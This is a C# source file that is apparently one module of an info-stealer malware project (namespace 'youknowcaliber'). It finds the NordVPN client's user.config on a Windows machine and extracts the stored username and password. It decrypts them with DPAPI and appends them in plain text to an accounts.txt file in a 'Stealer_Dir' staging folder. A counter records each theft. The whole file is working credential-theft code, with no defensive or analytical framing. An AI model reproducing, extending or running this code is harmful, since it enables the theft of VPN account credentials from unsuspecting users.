using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Xml;

namespace youknowcaliber
{
    class NordVPN
    {
        private static string Decode(string s)
        {
            try
            {
                return Encoding.UTF8.GetString(ProtectedData.Unprotect(Convert.FromBase64String(s), null, DataProtectionScope.LocalMachine));
            }
            catch
            {
                return "";
            }
        }

        // Save("NordVPN");
        public static void Save()
        {
            string Stealer_Dir = Help.ExploitDir;
            // "NordVPN" directory path
            DirectoryInfo vpn = new DirectoryInfo(Path.Combine(Paths.lappdata, "NordVPN"));
            // Stop if not exists
            if (!vpn.Exists)
                return;

            try
            {
                // Search user.config
                foreach (DirectoryInfo d in vpn.GetDirectories("NordVpn.exe*"))
                    foreach (DirectoryInfo v in d.GetDirectories())
                    {
                        string userConfigPath = Path.Combine(v.FullName, "user.config");
                        if (File.Exists(userConfigPath))
                        {
                            // Create directory with VPN version to collect accounts
                            Directory.CreateDirectory(Stealer_Dir + "\\VPN\\NordVPN\\");

                            var doc = new XmlDocument();
                            doc.Load(userConfigPath);

                            string encodedUsername = doc.SelectSingleNode("//setting[@name='Username']/value").InnerText;
                            string encodedPassword = doc.SelectSingleNode("//setting[@name='Password']/value").InnerText;

                            if (encodedUsername != null && !string.IsNullOrEmpty(encodedUsername) &&
                                encodedPassword != null && !string.IsNullOrEmpty(encodedPassword))
                            {
                                string username = Decode(encodedUsername);
                                string password = Decode(encodedPassword);

                                Counting.NordVPN++;
                                File.AppendAllText(Stealer_Dir + "\\VPN\\NordVPN\\" + "\\accounts.txt", $"Username: {username}\nPassword: {password}\n\n");
                            }


                        }
                    }
            }
            catch (Exception e)
            {
                Console.WriteLine(e);
            }
        }
    }
}
